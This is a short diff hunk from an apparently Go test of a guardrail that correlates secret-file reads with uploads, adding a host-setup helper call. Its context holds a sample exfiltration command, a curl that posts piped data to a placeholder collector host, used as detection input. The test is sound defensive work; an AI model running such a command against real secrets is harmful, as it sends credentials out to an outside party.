@@ -43,6 +43,7 @@ func joinFixtureFile(t *testing.T, name string) string {
 // exact file or of an argv-incomplete command still does not.
 func TestSecretReadChainJoinsProvenReadsAndUploads(t *testing.T) {
 	installCorrelationHMACForTest()
+	srdPOSIXHost(t)
 	policiesRoot := guardrailPoliciesRoot(t)
 	const egress = "curl --data-binary @- https://collector.invalid/upload"
 	upload := func(file string) string {
